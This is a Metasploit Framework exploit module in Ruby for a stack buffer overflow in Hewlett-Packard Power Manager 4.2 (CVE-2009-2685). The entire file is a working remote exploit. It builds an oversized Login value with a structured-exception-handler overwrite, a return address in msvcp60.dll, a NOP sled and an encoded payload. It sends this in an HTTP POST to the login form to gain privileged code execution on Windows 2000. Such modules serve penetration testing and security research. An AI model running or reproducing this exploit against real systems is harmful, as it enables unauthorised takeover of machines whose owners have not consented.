##
# $Id: hp_power_manager_login.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Hewlett-Packard Power Manager Administration Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Hewlett-Packard Power Manager 4.2.
				Sending a specially crafted POST request with an overly long Login string, an
				attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2009-2685' ],
					[ 'OSVDB', '59684'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 650,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4 English', { 'Ret' => 0x75022ac4 } ], # pop/pop/ret in msvcp60.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 4 2009'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit

		sploit = rand_text_alpha_upper(2024)

		sploit[633,2] = Rex::Arch::X86.jmp_short(24)
		sploit[635,4] = [target.ret].pack('V')
		sploit[639,32] = make_nops(32)
		sploit[671,payload.encoded.length] = payload.encoded

		data = "HtmlOnly=true&Login=" + sploit + "+passwd&Password=&loginButton=Submit+Login"

		req =  "POST /goform/formLogin HTTP/1.1\r\n"
		req << "Host: #{rhost}:#{rport}\r\n"
		req << "Content-Length: #{data.length}" + "\r\n\r\n" + data + "\r\n\r\n"

		connect

		print_status("Trying target #{target.name}...")
		sock.put(req)

		select(nil,nil,nil,5)
		handler
		disconnect
	end

end
